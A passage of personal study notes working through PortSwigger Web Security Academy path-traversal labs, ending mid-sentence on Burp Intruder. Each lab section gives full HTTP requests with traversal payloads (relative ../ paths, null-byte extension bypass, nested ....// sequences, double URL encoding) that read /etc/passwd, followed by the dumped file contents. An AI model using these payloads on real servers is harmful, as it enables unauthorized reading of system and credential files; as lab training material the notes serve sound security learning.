www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false


i) Thus we are able to modify the request in repeater and see the contents of file /etc/passwd
-> Hence this is File/Path traversal vulnerability




19) BAC: Path/Directory Traversal vulnerabilities:5 - Bypassing abosolute path restriction 

Target website link: https://portswigger.net/web-security/file-path-traversal/lab-simple


a) Sometimes exploiting the target that was showed will not work, but the target is still vulnerable
-> For example - here we can find that the http request returning with "No such file"


eg:
HTTP Request:
GET /image?filename=/etc/passwd HTTP/1.1
Host: 0acb00270466b243824bd37c00d500cd.web-security-academy.net
Cookie: session=ezVA4YD4eKY17DFUe1yAg8i898DiROJi
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0acb00270466b243824bd37c00d500cd.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


HTTP Response:
"No such file"

b) Here there are two possibilities:
->  Target is not vulnerable or it is not loading for some reason
-> Here target is only allowing to access from particular directory: /var/www/html/images and not from any other directory 

c) Thus we can infer that the target is vulnerable 
but it has some restrictions 

d) So next time we can try is: 
instead of putting absolute path like: /etc/passwd 
-> We can got out three directories and then refer to 
/etc/passwd

e) We can specify as : ../../../etc/passwd 

-> Thus by modifying the request, though we are not able 
to access the absolute path directly, we are able to access the path by giving
relative paths 
-> Hence this is called bypassing absolute path restriction 

eg: Modified request

GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a7300a4032705c88ac20997008f00c0.web-security-academy.net
Cookie: session=kw4LxLKrghOB2MVaeWYHJzBz9jUaMwgI
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a7300a4032705c88ac20997008f00c0.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


eg: Modified response:
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false





20) BAC: Path/Directory Traversal vulnerabilities:5 -  Bypassing Hard-coded Extensions:

Target website: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
Target lab: 

a) In the target lab, if i try in repeater to access:  ../../../etc/passwd , it is not loading the file in response
-> There are chances that the target application is expecting file of type .jpg 

b) I will try to use a null byte: 

 ../../../etc/passwd%00.jpg
    |
	|
	|

 ../../../etc/passwd 
 
 
b) Here %00 is called null byte
-> By using this - filter will assume that, the file used 
is of .jpg format, 
-> WHen the process reads it, it will read it only as :

 ../../../etc/passwd 
 
 -> This is because processing will terminate on 
 receiving a null byte(%00), so whatever we type 
 after that does not matter and  it will be read as:
 
  ../../../etc/passwd 
 
 -> It is like adding comments, where the server 
 ignores it 
 
 c) 
 eg:
 
 Request:
 GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: 0a2f00d4045282ee80639460005400de.web-security-academy.net
Cookie: session=3nnBJTAtsMQqsuYS7z7KvMAASCfyZ11a
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a2f00d4045282ee80639460005400de.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


Response:
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false




21) BAC: Path/Directory Traversal vulnerabilities:5  Bypassing Filtering 

Target Lab: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

a) Now if we go to the repeater and try for a) absolute path b) Relative path c) null byte injection
-> None of them will be working now 
b) On thinking what the programmer of the target application could have implemented :
-> They could have thought of stopping the vulnerability by stripping off the value
-> If there is ../  - they will simply remove it 
c) If that is the case, we will double all ../ we use 

eg:
../../../etc/passwd

to

....//....//....//etc/passwd

d) Thus if the target application is seeing ../, they will remove one set 
and hence we will get: ../../../etc/passwd

-> Thus even if the filter gets implemented, 
we will have the string to be passed 

e) 

eg; Request

GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0a0500e60324e3118219f103006600fb.web-security-academy.net
Cookie: session=vZDoFRzAFzKyniVY9kDC8zshAWGjq9Dy
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a0500e60324e3118219f103006600fb.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


Response:
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false


  
  
22) BAC: Path/Directory Traversal vulnerabilities:5  Bypassing hard-coded paths 
a) If we use any of the BAC techniques like: a) absolute path 2) relative path 3) null byte injection 4) doubling ..//
-> all these techniques wont work 
b) This is because target may have a number of filters 
c) Hence we may need to we a number of combinations a) null byte , doubling etc  

d) Here original request contains a full path: 

request:
GET /image?filename=/var/www/images/8.jpg HTTP/2
Host: 0af800ac0417ab9b806fb34f00b500f6.web-security-academy.net
Cookie: session=9aLAApNTivTDzzeJp0rfPvwSsKxKqFWI
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0af800ac0417ab9b806fb34f00b500f6.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


e) In modified request, we are going three directories, until we go to the base and 
then we are loading /etc/passwd 


eg: Request
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0af800ac0417ab9b806fb34f00b500f6.web-security-academy.net
Cookie: session=9aLAApNTivTDzzeJp0rfPvwSsKxKqFWI
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0af800ac0417ab9b806fb34f00b500f6.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

Response: 
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false




22) BAC: Path/Directory Traversal vulnerabilities:5  Bypassing Advanced filtering
Target website: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode


a) In this section how to bypass another security filtering that is done by 
programmers with reards to BAC: Path/Directory Traversal
b) We might need to combine the tricks which we have learnt until now .
c) Here in target lab, if we try to access /etc/passwd using 
repeater we will not be able to access it 
d) We will try to: url-encode the forward slash of : ../../../etc/passwd 
-> This can be done by right-clicking repeater,
-> Repeater-request -> convert selection -> URL -> URL - url-encode-all-characters 
e) By telling url-encode-all-characters, we are 
going to transform the forward slash to its url encoding: %2f
f) By mentioning %2f in place of /, we are telling same thing differently
-> We are still telling web application to 
load a forward slash - but the reason why we are writing like this - is we are assuming 
that the target application has some kind of firewall 
or filter - which checks if the value sent to it 
is containing forward slash and if it contains - it will be 
stripping off or removing those characters 
g) Here are the ASCII encoding reference:
https://www.w3schools.com/tags/ref_urlencode.ASP


g) After modifying with url encoded characters also, we dont get the expected response

../../../etc/passwd   to   ..%2f..%2f..%2fetc%2fpasswd

eg:

Request:
GET /image?filename=..%2f..%2f..%2fetc%2fpasswd HTTP/2
Host: 0a7a002d04741d5d816d7501007700d4.web-security-academy.net
Cookie: session=PUTrtMXtNSLumPXXLUq95XX1JE5zAPG8
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a7a002d04741d5d816d7501007700d4.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


Response:
"No such file"

h) The reason why we are not able to access  is - there are chances that target application is checking if the input 
url is url encoded and do an url-decode on it
-> This operation will tranform all %2f back to / 
-> If it checks after url decoding if the input contains / then it wont allow the request 

i) So to bypass this filter, we will double url encode the characters 


..%252f..%252f..%252fetc%252fpasswd 

ii) THus if we double encode the characters, if we target application tries to url decode, it will not contain any /

because : ..%252f..%252f..%252fetc%252fpasswd   gets converted to ..%2f..%2f..%2fetc%2fpasswd

iii) In our case: double encoding converts 

..%2f..%2f..%2fetc%2fpasswd   to ..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd


eg:
request:
GET /image?filename=..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd HTTP/2
Host: 0a7a002d04741d5d816d7501007700d4.web-security-academy.net
Cookie: session=PUTrtMXtNSLumPXXLUq95XX1JE5zAPG8
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a7a002d04741d5d816d7501007700d4.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9




Response:
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false


23) So far we convered most common methods of discovering path or directory traversal vulnerabilities
and how to bypass security 
a) As told earlier, we may need to combine different types of technique - in order to bypass security 
and discover such bugs 
b) The cheatsheet: directory-traversal-cheatsheet.txt contains large number of payloads that we could use ,
to bypass and discover these vulnerabilities 
c) But it becomes tedious when we want to use each of the payloads in text file, to trial and error and find the vulnerabilities 
d) Once we go to a site and just analyse or have a hint that a particular target has vulnerability:
-> Then we can automate the task of sending all payloads in directory-traversal-cheatsheet.txt - by using the 
intruder functionality of burpsuite 

####
Intruder 
-> Intruder helps to manually define which 
parts of the request you want to test 
-> As humans we rely on our ability to 
identify the weak spots and then we give 
task to intruder 
-> Intruder does the repetitive boring task of 
simply sending all of these requests in the place where it is weak 
#####

e) In our scenario, we think that the endpoint 
is vulnerable 

eg: 
GET /image?filename=31.jpg HTTP/2


f) To use intruder, right click request we obtained 
in proxy and select option :"send to intruder" 

i) In intruder screen -> Positions 
-> We have to tell Burp - what to test in this 
request 

eg: Intruder screen -> Positions 
GET /image?filename=§7.jpg§ HTTP/2
Host: 0a88007d04df05ef80fa1c4600f60085.web-security-academy.net
Cookie: session=§PJ0vQgZzXdZiEZRbGTtRfQ30DuxemSrO§
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a88007d04df05ef80fa1c4600f60085.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

j) In intruder screen -> Positions 
i) In Payload positions, we select "Clear $" sign , this is because the $signs tell 
